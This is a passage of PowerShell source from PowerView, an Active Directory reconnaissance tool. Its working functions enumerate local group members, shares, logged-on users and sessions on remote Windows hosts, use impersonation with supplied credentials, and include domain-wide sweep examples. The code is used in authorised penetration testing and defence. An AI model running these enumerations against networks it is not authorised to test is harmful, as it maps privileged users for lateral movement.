[ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)\n\n                # locate the offset of the initial intPtr\n                $Offset = $PtrInfo.ToInt64()\n\n                # 0 = success\n                if (($Result -eq 0) -and ($Offset -gt 0)) {\n\n                    # Work out how much to increment the pointer by finding out the size of the structure\n                    $Increment = $LOCALGROUP_INFO_1::GetSize()\n\n                    # parse all the result structures\n                    for ($i = 0; ($i -lt $EntriesRead); $i++) {\n                        # create a new int ptr at the given offset and cast the pointer as our result structure\n                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset\n                        $Info = $NewIntPtr -as $LOCALGROUP_INFO_1\n\n                        $Offset = $NewIntPtr.ToInt64()\n                        $Offset += $Increment\n\n                        $LocalGroup = New-Object PSObject\n                        $LocalGroup | Add-Member Noteproperty 'ComputerName' $Computer\n                        $LocalGroup | Add-Member Noteproperty 'GroupName' $Info.lgrpi1_name\n                        $LocalGroup | Add-Member Noteproperty 'Comment' $Info.lgrpi1_comment\n                        $LocalGroup.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')\n                        $LocalGroup\n                    }\n                    # free up the result buffer\n                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)\n                }\n                else {\n                    Write-Verbose \"[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)\"\n                }\n            }\n            else {\n                # otherwise we're using the WinNT service provider\n                $ComputerProvider = [ADSI]\"WinNT://$Computer,computer\"\n\n                $ComputerProvider.psbase.children | Where-Object { $_.psbase.schemaClassName -eq 'group' } | ForEach-Object {\n                    $LocalGroup = ([ADSI]$_)\n                    $Group = New-Object PSObject\n                    $Group | Add-Member Noteproperty 'ComputerName' $Computer\n                    $Group | Add-Member Noteproperty 'GroupName' ($LocalGroup.InvokeGet('Name'))\n                    $Group | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalGroup.InvokeGet('objectsid'),0)).Value)\n                    $Group | Add-Member Noteproperty 'Comment' ($LocalGroup.InvokeGet('Description'))\n                    $Group.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')\n                    $Group\n                }\n            }\n        }\n    }\n    \n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-NetLocalGroupMember {\n<#\n.SYNOPSIS\n\nEnumerates members of a specific local group on the local (or remote) machine.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect, Convert-ADName  \n\n.DESCRIPTION\n\nThis function will enumerate the members of a specified local group  on the\ncurrent, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers\nwill be used (for speed). Specifying \"-Method WinNT\" causes the WinNT service provider\nto be used instead, which returns a larger amount of information.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for sessions (also accepts IP addresses).\nDefaults to the localhost.\n\n.PARAMETER GroupName\n\nThe local group name to query for users. If not given, it defaults to \"Administrators\".\n\n.PARAMETER Method\n\nThe collection method to use, defaults to 'API', also accepts 'WinNT'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to a remote machine. Only applicable with \"-Method WinNT\".\n\n.EXAMPLE\n\nGet-NetLocalGroupMember | ft\n\nComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain\n------------   ---------      ----------     ---                   -------       --------\nWINDOWS1       Administrators WINDOWS1\\Ad... S-1-5-21-25...          False          False\nWINDOWS1       Administrators WINDOWS1\\lo... S-1-5-21-25...          False          False\nWINDOWS1       Administrators TESTLAB\\Dom... S-1-5-21-89...           True           True\nWINDOWS1       Administrators TESTLAB\\har... S-1-5-21-89...          False           True\n\n.EXAMPLE\n\nGet-NetLocalGroupMember -Method winnt | ft\n\nComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain\n------------   ---------      ----------     ---                   -------       --------\nWINDOWS1       Administrators WINDOWS1\\Ad... S-1-5-21-25...          False          False\nWINDOWS1       Administrators WINDOWS1\\lo... S-1-5-21-25...          False          False\nWINDOWS1       Administrators TESTLAB\\Dom... S-1-5-21-89...           True           True\nWINDOWS1       Administrators TESTLAB\\har... S-1-5-21-89...          False           True\n\n.EXAMPLE\n\nGet-NetLocalGroup | Get-NetLocalGroupMember | ft\n\nComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain\n------------   ---------      ----------     ---                   -------       --------\nWINDOWS1       Administrators WINDOWS1\\Ad... S-1-5-21-25...          False          False\nWINDOWS1       Administrators WINDOWS1\\lo... S-1-5-21-25...          False          False\nWINDOWS1       Administrators TESTLAB\\Dom... S-1-5-21-89...           True           True\nWINDOWS1       Administrators TESTLAB\\har... S-1-5-21-89...          False           True\nWINDOWS1       Guests         WINDOWS1\\Guest S-1-5-21-25...          False          False\nWINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False\nWINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False\nWINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False\nWINDOWS1       Users          WINDOWS1\\lo... S-1-5-21-25...          False        UNKNOWN\nWINDOWS1       Users          TESTLAB\\Dom... S-1-5-21-89...           True        UNKNOWN\n\n.EXAMPLE\n\nGet-NetLocalGroupMember -ComputerName primary.testlab.local | ft\n\nComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain\n------------   ---------      ----------     ---                   -------       --------\nprimary.tes... Administrators TESTLAB\\Adm... S-1-5-21-89...          False          False\nprimary.tes... Administrators TESTLAB\\loc... S-1-5-21-89...          False          False\nprimary.tes... Administrators TESTLAB\\Ent... S-1-5-21-89...           True          False\nprimary.tes... Administrators TESTLAB\\Dom... S-1-5-21-89...           True          False\n\n.OUTPUTS\n\nPowerView.LocalGroupMember.API\n\nCustom PSObject with translated group property fields from API results.\n\nPowerView.LocalGroupMember.WinNT\n\nCustom PSObject with translated group property fields from WinNT results.\n\n.LINK\n\nhttp://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together\nhttp://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx\nhttps://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.LocalGroupMember.API')]\n    [OutputType('PowerView.LocalGroupMember.WinNT')]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = $Env:COMPUTERNAME,\n\n        [Parameter(ValueFromPipelineByPropertyName = $True)]\n        [ValidateNotNullOrEmpty()]\n        [String]\n        $GroupName = 'Administrators',\n\n        [ValidateSet('API', 'WinNT')]\n        [Alias('CollectionMethod')]\n        [String]\n        $Method = 'API',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            if ($Method -eq 'API') {\n                # if we're using the Netapi32 NetLocalGroupGetMembers API call to get the local group information\n\n                # arguments for NetLocalGroupGetMembers\n                $QueryLevel = 2\n                $PtrInfo = [IntPtr]::Zero\n                $EntriesRead = 0\n                $TotalRead = 0\n                $ResumeHandle = 0\n\n                # get the local user information\n                $Result = $Netapi32::NetLocalGroupGetMembers($Computer, $GroupName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)\n\n                # locate the offset of the initial intPtr\n                $Offset = $PtrInfo.ToInt64()\n\n                $Members = @()\n\n                # 0 = success\n                if (($Result -eq 0) -and ($Offset -gt 0)) {\n\n                    # Work out how much to increment the pointer by finding out the size of the structure\n                    $Increment = $LOCALGROUP_MEMBERS_INFO_2::GetSize()\n\n                    # parse all the result structures\n                    for ($i = 0; ($i -lt $EntriesRead); $i++) {\n                        # create a new int ptr at the given offset and cast the pointer as our result structure\n                        $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset\n                        $Info = $NewIntPtr -as $LOCALGROUP_MEMBERS_INFO_2\n\n                        $Offset = $NewIntPtr.ToInt64()\n                        $Offset += $Increment\n\n                        $SidString = ''\n                        $Result2 = $Advapi32::ConvertSidToStringSid($Info.lgrmi2_sid, [ref]$SidString);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()\n\n                        if ($Result2 -eq 0) {\n                            Write-Verbose \"[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)\"\n                        }\n                        else {\n                            $Member = New-Object PSObject\n                            $Member | Add-Member Noteproperty 'ComputerName' $Computer\n                            $Member | Add-Member Noteproperty 'GroupName' $GroupName\n                            $Member | Add-Member Noteproperty 'MemberName' $Info.lgrmi2_domainandname\n                            $Member | Add-Member Noteproperty 'SID' $SidString\n                            $IsGroup = $($Info.lgrmi2_sidusage -eq 'SidTypeGroup')\n                            $Member | Add-Member Noteproperty 'IsGroup' $IsGroup\n                            $Member.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')\n                            $Members += $Member\n                        }\n                    }\n\n                    # free up the result buffer\n                    $Null = $Netapi32::NetApiBufferFree($PtrInfo)\n\n                    # try to extract out the machine SID by using the -500 account as a reference\n                    $MachineSid = $Members | Where-Object {$_.SID -match '.*-500' -or ($_.SID -match '.*-501')} | Select-Object -Expand SID\n                    if ($MachineSid) {\n                        $MachineSid = $MachineSid.Substring(0, $MachineSid.LastIndexOf('-'))\n\n                        $Members | ForEach-Object {\n                            if ($_.SID -match $MachineSid) {\n                                $_ | Add-Member Noteproperty 'IsDomain' $False\n                            }\n                            else {\n                                $_ | Add-Member Noteproperty 'IsDomain' $True\n                            }\n                        }\n                    }\n                    else {\n                        $Members | ForEach-Object {\n                            if ($_.SID -notmatch 'S-1-5-21') {\n                                $_ | Add-Member Noteproperty 'IsDomain' $False\n                            }\n                            else {\n                                $_ | Add-Member Noteproperty 'IsDomain' 'UNKNOWN'\n                            }\n                        }\n                    }\n                    $Members\n                }\n                else {\n                    Write-Verbose \"[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)\"\n                }\n            }\n            else {\n                # otherwise we're using the WinNT service provider\n                try {\n                    $GroupProvider = [ADSI]\"WinNT://$Computer/$GroupName,group\"\n\n                    $GroupProvider.psbase.Invoke('Members') | ForEach-Object {\n\n                        $Member = New-Object PSObject\n                        $Member | Add-Member Noteproperty 'ComputerName' $Computer\n                        $Member | Add-Member Noteproperty 'GroupName' $GroupName\n\n                        $LocalUser = ([ADSI]$_)\n                        $AdsPath = $LocalUser.InvokeGet('AdsPath').Replace('WinNT://', '')\n                        $IsGroup = ($LocalUser.SchemaClassName -like 'group')\n\n                        if(([regex]::Matches($AdsPath, '/')).count -eq 1) {\n                            # DOMAIN\\user\n                            $MemberIsDomain = $True\n                            $Name = $AdsPath.Replace('/', '\\')\n                        }\n                        else {\n                            # DOMAIN\\machine\\user\n                            $MemberIsDomain = $False\n                            $Name = $AdsPath.Substring($AdsPath.IndexOf('/')+1).Replace('/', '\\')\n                        }\n\n                        $Member | Add-Member Noteproperty 'AccountName' $Name\n                        $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)\n                        $Member | Add-Member Noteproperty 'IsGroup' $IsGroup\n                        $Member | Add-Member Noteproperty 'IsDomain' $MemberIsDomain\n\n                        # if ($MemberIsDomain) {\n                        #     # translate the binary sid to a string\n                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)\n                        #     $Member | Add-Member Noteproperty 'Description' ''\n                        #     $Member | Add-Member Noteproperty 'Disabled' ''\n\n                        #     if ($IsGroup) {\n                        #         $Member | Add-Member Noteproperty 'LastLogin' ''\n                        #     }\n                        #     else {\n                        #         try {\n                        #             $Member | Add-Member Noteproperty 'LastLogin' $LocalUser.InvokeGet('LastLogin')\n                        #         }\n                        #         catch {\n                        #             $Member | Add-Member Noteproperty 'LastLogin' ''\n                        #         }\n                        #     }\n                        #     $Member | Add-Member Noteproperty 'PwdLastSet' ''\n                        #     $Member | Add-Member Noteproperty 'PwdExpired' ''\n                        #     $Member | Add-Member Noteproperty 'UserFlags' ''\n                        # }\n                        # else {\n                        #     # translate the binary sid to a string\n                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)\n                        #     $Member | Add-Member Noteproperty 'Description' ($LocalUser.Description)\n\n                        #     if ($IsGroup) {\n                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ''\n                        #         $Member | Add-Member Noteproperty 'PwdExpired' ''\n                        #         $Member | Add-Member Noteproperty 'UserFlags' ''\n                        #         $Member | Add-Member Noteproperty 'Disabled' ''\n                        #         $Member | Add-Member Noteproperty 'LastLogin' ''\n                        #     }\n                        #     else {\n                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ( (Get-Date).AddSeconds(-$LocalUser.PasswordAge[0]))\n                        #         $Member | Add-Member Noteproperty 'PwdExpired' ( $LocalUser.PasswordExpired[0] -eq '1')\n                        #         $Member | Add-Member Noteproperty 'UserFlags' ( $LocalUser.UserFlags[0] )\n                        #         # UAC flags of 0x2 mean the account is disabled\n                        #         $Member | Add-Member Noteproperty 'Disabled' $(($LocalUser.UserFlags.value -band 2) -eq 2)\n                        #         try {\n                        #             $Member | Add-Member Noteproperty 'LastLogin' ( $LocalUser.LastLogin[0])\n                        #         }\n                        #         catch {\n                        #             $Member | Add-Member Noteproperty 'LastLogin' ''\n                        #         }\n                        #     }\n                        # }\n\n                        $Member\n                    }\n                }\n                catch {\n                    Write-Verbose \"[Get-NetLocalGroupMember] Error for $Computer : $_\"\n                }\n            }\n        }\n    }\n    \n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-NetShare {\n<#\n.SYNOPSIS\n\nReturns open shares on the local (or a remote) machine.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  \n\n.DESCRIPTION\n\nThis function will execute the NetShareEnum Win32API call to query\na given host for open shares. This is a replacement for \"net share \\\\hostname\".\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for shares (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nGet-NetShare\n\nReturns active shares on the local host.\n\n.EXAMPLE\n\nGet-NetShare -ComputerName sqlserver\n\nReturns active shares on the 'sqlserver' host\n\n.EXAMPLE\n\nGet-DomainComputer | Get-NetShare\n\nReturns all shares for all computers in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-NetShare -ComputerName sqlserver -Credential $Cred\n\n.OUTPUTS\n\nPowerView.ShareInfo\n\nA PSCustomObject representing a SHARE_INFO_1 structure, including\nthe name/type/remark for each share, with the ComputerName added.\n\n.LINK\n\nhttp://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n#>\n\n    [OutputType('PowerView.ShareInfo')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # arguments for NetShareEnum\n            $QueryLevel = 1\n            $PtrInfo = [IntPtr]::Zero\n            $EntriesRead = 0\n            $TotalRead = 0\n            $ResumeHandle = 0\n\n            # get the raw share information\n            $Result = $Netapi32::NetShareEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)\n\n            # locate the offset of the initial intPtr\n            $Offset = $PtrInfo.ToInt64()\n\n            # 0 = success\n            if (($Result -eq 0) -and ($Offset -gt 0)) {\n\n                # work out how much to increment the pointer by finding out the size of the structure\n                $Increment = $SHARE_INFO_1::GetSize()\n\n                # parse all the result structures\n                for ($i = 0; ($i -lt $EntriesRead); $i++) {\n                    # create a new int ptr at the given offset and cast the pointer as our result structure\n                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset\n                    $Info = $NewIntPtr -as $SHARE_INFO_1\n\n                    # return all the sections of the structure - have to do it this way for V2\n                    $Share = $Info | Select-Object *\n                    $Share | Add-Member Noteproperty 'ComputerName' $Computer\n                    $Share.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')\n                    $Offset = $NewIntPtr.ToInt64()\n                    $Offset += $Increment\n                    $Share\n                }\n\n                # free up the result buffer\n                $Null = $Netapi32::NetApiBufferFree($PtrInfo)\n            }\n            else {\n                Write-Verbose \"[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)\"\n            }\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-NetLoggedon {\n<#\n.SYNOPSIS\n\nReturns users logged on the local (or a remote) machine.\nNote: administrative rights needed for newer Windows OSes.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  \n\n.DESCRIPTION\n\nThis function will execute the NetWkstaUserEnum Win32API call to query\na given host for actively logged on users.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for logged on users (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nGet-NetLoggedon\n\nReturns users actively logged onto the local host.\n\n.EXAMPLE\n\nGet-NetLoggedon -ComputerName sqlserver\n\nReturns users actively logged onto the 'sqlserver' host.\n\n.EXAMPLE\n\nGet-DomainComputer | Get-NetLoggedon\n\nReturns all logged on users for all computers in the domain.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-NetLoggedon -ComputerName sqlserver -Credential $Cred\n\n.OUTPUTS\n\nPowerView.LoggedOnUserInfo\n\nA PSCustomObject representing a WKSTA_USER_INFO_1 structure, including\nthe UserName/LogonDomain/AuthDomains/LogonServer for each user, with the ComputerName added.\n\n.LINK\n\nhttp://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n#>\n\n    [OutputType('PowerView.LoggedOnUserInfo')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # declare the reference variables\n            $QueryLevel = 1\n            $PtrInfo = [IntPtr]::Zero\n            $EntriesRead = 0\n            $TotalRead = 0\n            $ResumeHandle = 0\n\n            # get logged on user information\n            $Result = $Netapi32::NetWkstaUserEnum($Computer, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)\n\n            # locate the offset of the initial intPtr\n            $Offset = $PtrInfo.ToInt64()\n\n            # 0 = success\n            if (($Result -eq 0) -and ($Offset -gt 0)) {\n\n                # work out how much to increment the pointer by finding out the size of the structure\n                $Increment = $WKSTA_USER_INFO_1::GetSize()\n\n                # parse all the result structures\n                for ($i = 0; ($i -lt $EntriesRead); $i++) {\n                    # create a new int ptr at the given offset and cast the pointer as our result structure\n                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset\n                    $Info = $NewIntPtr -as $WKSTA_USER_INFO_1\n\n                    # return all the sections of the structure - have to do it this way for V2\n                    $LoggedOn = $Info | Select-Object *\n                    $LoggedOn | Add-Member Noteproperty 'ComputerName' $Computer\n                    $LoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LoggedOnUserInfo')\n                    $Offset = $NewIntPtr.ToInt64()\n                    $Offset += $Increment\n                    $LoggedOn\n                }\n\n                # free up the result buffer\n                $Null = $Netapi32::NetApiBufferFree($PtrInfo)\n            }\n            else {\n                Write-Verbose \"[Get-NetLoggedon] Error: $(([ComponentModel.Win32Exception] $Result).Message)\"\n            }\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-NetSession {\n<#\n.SYNOPSIS\n\nReturns session information for the local (or a remote) machine.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  \n\n.DESCRIPTION\n\nThis function will execute the NetSessionEnum Win32API call to query\na given host for active sessions.\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for sessions (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nGet-NetSession\n\nReturns active sessions on the local host.\n\n.EXAMPLE\n\nGet-NetSession -ComputerName sqlserver\n\nReturns active sessions on the 'sqlserver' host.\n\n.EXAMPLE\n\nGet-DomainController | Get-NetSession\n\nReturns active sessions on all domain controllers.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-NetSession -ComputerName sqlserver -Credential $Cred\n\n.OUTPUTS\n\nPowerView.SessionInfo\n\nA PSCustomObject representing a WKSTA_USER_INFO_1 structure, including\nthe CName/UserName/Time/IdleTime for each session, with the ComputerName added.\n\n.LINK\n\nhttp://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/\n#>\n\n    [OutputType('PowerView.SessionInfo')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost',\n\n        [Management.Automation.PSCredential]\n        [Management.Automation.CredentialAttribute()]\n        $Credential = [Management.Automation.PSCredential]::Empty\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            # arguments for NetSessionEnum\n            $QueryLevel = 10\n            $PtrInfo = [IntPtr]::Zero\n            $EntriesRead = 0\n            $TotalRead = 0\n            $ResumeHandle = 0\n\n            # get session information\n            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)\n\n            # locate the offset of the initial intPtr\n            $Offset = $PtrInfo.ToInt64()\n\n            # 0 = success\n            if (($Result -eq 0) -and ($Offset -gt 0)) {\n\n                # work out how much to increment the pointer by finding out the size of the structure\n                $Increment = $SESSION_INFO_10::GetSize()\n\n                # parse all the result structures\n                for ($i = 0; ($i -lt $EntriesRead); $i++) {\n                    # create a new int ptr at the given offset and cast the pointer as our result structure\n                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset\n                    $Info = $NewIntPtr -as $SESSION_INFO_10\n\n                    # return all the sections of the structure - have to do it this way for V2\n                    $Session = $Info | Select-Object *\n                    $Session | Add-Member Noteproperty 'ComputerName' $Computer\n                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')\n                    $Offset = $NewIntPtr.ToInt64()\n                    $Offset += $Increment\n                    $Session\n                }\n\n                # free up the result buffer\n                $Null = $Netapi32::NetApiBufferFree($PtrInfo)\n            }\n            else {\n                Write-Verbose \"[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)\"\n            }\n        }\n    }\n\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-RegLoggedOn {\n<#\n.SYNOPSIS\n\nReturns who is logged onto the local (or a remote) machine\nthrough enumeration of remote registry keys.\n\nNote: This function requires only domain user rights on the\nmachine you're enumerating, but remote registry must be enabled.\n\nAuthor: Matt Kelly (@BreakersAll)  \nLicense: BSD 3-Clause  \nRequired Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf, ConvertFrom-SID  \n\n.DESCRIPTION\n\nThis function will query the HKU registry values to retrieve the local\nlogged on users SID and then attempt and reverse it.\nAdapted technique from Sysinternal's PSLoggedOn script. Benefit over\nusing the NetWkstaUserEnum API (Get-NetLoggedon) of less user privileges\nrequired (NetWkstaUserEnum requires remote admin access).\n\n.PARAMETER ComputerName\n\nSpecifies the hostname to query for remote registry values (also accepts IP addresses).\nDefaults to 'localhost'.\n\n.PARAMETER Credential\n\nA [Management.Automation.PSCredential] object of alternate credentials\nfor connection to the remote system using Invoke-UserImpersonation.\n\n.EXAMPLE\n\nGet-RegLoggedOn\n\nReturns users actively logged onto the local host.\n\n.EXAMPLE\n\nGet-RegLoggedOn -ComputerName sqlserver\n\nReturns users actively logged onto the 'sqlserver' host.\n\n.EXAMPLE\n\nGet-DomainController | Get-RegLoggedOn\n\nReturns users actively logged on all domain controllers.\n\n.EXAMPLE\n\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)\nGet-RegLoggedOn -ComputerName sqlserver -Credential $Cred\n\n.OUTPUTS\n\nPowerView.RegLoggedOnUser\n\nA PSCustomObject including the UserDomain/UserName/UserSID of each\nactively logged on user, with the ComputerName added.\n#>\n\n    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]\n    [OutputType('PowerView.RegLoggedOnUser')]\n    [CmdletBinding()]\n    Param(\n        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]\n        [Alias('HostName', 'dnshostname', 'name')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $ComputerName = 'localhost'\n    )\n\n    BEGIN {\n        if ($PSBoundParameters['Credential']) {\n            $LogonToken = Invoke-UserImpersonation -Credential $Credential\n        }\n    }\n\n    PROCESS {\n        ForEach ($Computer in $ComputerName) {\n            try {\n                # retrieve HKU remote registry values\n                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', \"$ComputerName\")\n\n                # sort out bogus sid's like _class\n                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {\n                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType 'DomainSimple'\n\n                    if ($UserName) {\n                        $UserName, $UserDomain = $UserName.Split('@')\n                    }\n                    else {\n                        $UserName = $_\n                        $UserDomain = $Null\n                    }\n\n                    $RegLoggedOnUser = New-Object PSObject\n                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' \"$ComputerName\"\n                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain\n                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName\n                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_\n                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')\n                    $RegLoggedOnUser\n                }\n            }\n            catch {\n                Write-Verbose \"[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_\"\n            }\n        }\n    }\n\n    END {\n        if ($LogonToken) {\n            Invoke-RevertToSelf -TokenHandle $LogonToken\n        }\n    }\n}\n\n\nfunction Get-NetRDPSession {\n<#\n.SYNOPSIS\n\nReturns remote desktop/session information for the local (or a remote) machine.\n\nNote: only members of the Administrators or Account Operators local group\ncan successfully execute this functionality on a remote target.\n\nAuthor: Will Schroeder (@harmj0y)  \nLicense: BSD 3-Clause  \nRequired Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  \n\n.DESCRIPTION\n\nThis function will execute the WTSEnumerateSessionsEx and 